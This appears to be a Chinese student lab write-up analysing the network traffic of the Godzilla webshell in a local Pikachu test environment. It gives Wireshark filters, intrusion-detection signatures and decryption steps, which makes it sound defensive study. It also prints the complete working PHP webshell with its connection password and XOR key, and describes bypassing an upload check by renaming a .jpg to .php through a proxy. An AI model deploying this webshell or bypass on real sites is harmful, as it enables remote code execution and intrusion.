---
title: "流量特征分析"
description: "菜刀、冰蝎、蚁剑、哥斯拉的流量特征分析：1、搭建测试环境；2、分析流量特征（wireshark）2.1工作流程；2.2定义流量特征字符串作为入侵检测依据；3、进阶部分选做，若有加密，完成解密工作，3.1密钥获取；3.2流量解密并解析控制过程。以上工作可利用开源项目。"
slug: 
date: 
image: 
categories:
    - stu
tags:
    - 
weight: 1    
---



### 哥斯拉

使用哥斯拉生成木马，当前是要上传至PHP study部署的本地网站中，该网站只能解析.php文件，所以要注意有效载荷的选择，如果选择的载荷不是php，访问上传路径时将会直接显示jsp的源码，正常来所说访问http://xxx/test1.jsp文件php内容被解析会出现空白，是不会出现以下情况：

```
404 Not Found
403 Forbidden
500 Internal Server Error
直接显示 JSP 源码
下载文件
```

![](https://img.xiaoyuwell.top/PicGo/20260719221121622.png)

上传文件的流量

浏览器发给代理：

帧4971--->5778：test.jpg

![](https://img.xiaoyuwell.top/PicGo/20260722214507699.png)

![](https://img.xiaoyuwell.top/PicGo/20260722214538051.png)

代理转发网站：

5772--->5776：文件重命名为test.php，绕过文件上传的限制

![](https://img.xiaoyuwell.top/PicGo/20260722214617973.png)

![](https://img.xiaoyuwell.top/PicGo/20260722214635884.png)

当前木马通过该接口进行上传至网站根目录：

```
http://localhost/pikachu-master/vul/unsafeupload/clientcheck.php
```

通过过滤，经过当前接口上传的流量：

```
http.request.uri contains "clientcheck.php"
```

![](https://img.xiaoyuwell.top/PicGo/20260722185555053.png)

文件是通过POST方式上传：

```
http.request.method == "POST"
```

![](https://img.xiaoyuwell.top/PicGo/20260722185809149.png)

通过对数据包的流追踪，可以发现上传主机IP，文件名，内容

![](https://img.xiaoyuwell.top/PicGo/20260722190100502.png)

```php
<?php
@session_start();
@set_time_limit(0);
@error_reporting(0);
function encode($D,$K){
    for($i=0;$i<strlen($D);$i++) {
        $c = $K[$i+1&15];
        $D[$i] = $D[$i]^$c;
    }
    return $D;
}
$pass='pass123';  #连接密码
$payloadName='payload';
$key='32250170a0dca92d';#16字符的循环XOR密钥，用于处理请求和响应数据
if (isset($_POST[$pass])){
    $data=encode(base64_decode($_POST[$pass]),$key);
    if (isset($_SESSION[$payloadName])){
        $payload=encode($_SESSION[$payloadName],$key);
        if (strpos($payload,"getBasicsInfo")===false){
            $payload=encode($payload,$key);
        }
		eval($payload);
        echo substr(md5($pass.$key),0,16);
        echo base64_encode(encode(@run($data),$key));
        echo substr(md5($pass.$key),16);
    }else{
        if (strpos($data,"getBasicsInfo")!==false){
            $_SESSION[$payloadName]=encode($data,$key);
        }
    }
}
```

```
$pass='pass123';  #连接密码
$payloadName='payload';
$key='32250170a0dca92d';#16字符的循环XOR密钥，用于处理请求和响应数据
```

如果只知道连接密码+请求数据包（密文）---->密钥

![](https://img.xiaoyuwell.top/PicGo/20260722191302936.png)

请求连接请求包解密：

![](https://img.xiaoyuwell.top/PicGo/20260719220856392.png)

通过密钥可以对数据包的加密数据进行解密

测试连接时请求包解密

![](https://img.xiaoyuwell.top/PicGo/20260722191404360.png)

返回包解密，返回ok，可以连接

![](https://img.xiaoyuwell.top/PicGo/20260722191529031.png)

请求连接返回包解密：

```
ad7831bcf1071ce1fe48MDQwMmY0P/z8MGIk5L4cNjA0MA==07a416b4a2b4a5a0---->ok
```

![](https://img.xiaoyuwell.top/PicGo/20260719220610476.png)

连接成功后进入网站后，进入命令终端执行命令

![](https://img.xiaoyuwell.top/PicGo/20260719222336717.png)

```
http.request.method == "POST" &&
http.request.uri contains "/uploads/test1.php"
```

![](https://img.xiaoyuwell.top/PicGo/20260722200750398.png)

通过报文长度判断

报文请求和返回包进行解密，可以看到请求方对网站的行为操作

![](https://img.xiaoyuwell.top/PicGo/20260723115008140.png)

请求方在执行命令后回显内容

![](https://img.xiaoyuwell.top/PicGo/20260722201255202.png)

#### 工作流

1.缩小HTTP流量范围

通过源地址、目标地址、通信端口、请求方式进行过滤

```
tcp.port == 80 && http && http.request.method == "POST"
```

2.定位文件上传

```
http.request.method == "POST" &&
http.request.uri contains "clientcheck.php"
```

3.定位上传后的文件访问

```
http.request.method == "GET" &&
http.request.uri contains "/uploads/test1.php"
```

4.定位全部可疑通信

```
http.request.method == "POST" &&
http.request.uri contains "/uploads/test1.php" &&
tcp contains "pass123="
```

#### 可用于入侵检测的特征

1.文件上传特征

```
filename="test1.php"
Content-Type: image/jpeg
```

2.通信请求特征

```
POST /pikachu-master/vul/unsafeupload/uploads/test1.php
Content-Type: application/x-www-form-urlencoded
pass123=
```

过滤：

```
http.request.method == "POST" &&
http.request.uri contains "/uploads/test1.php" &&
tcp contains "pass123="
```

3.响应固定边界

所有有效哥斯拉响应都具有相同的固定首尾字符串：

```
响应前16字节：dc3c56c78ad0d757
响应后16字节：107d6cf7f72a8d20
```

4.行为特征

```
约52KB的初始化POST
随后立即出现80～100字节的小型POST
响应以固定16字节字符串包裹
持续向上传目录中的PHP文件发送POST
请求体参数值呈Base64/URL编码形式
```

#### 解密工作

1.密钥可从流量中获取或取得密码参数+加密密文可通过蓝队工具箱进行密钥计算

2.解密：获取密钥后，通过蓝队工具箱的webshell流量解密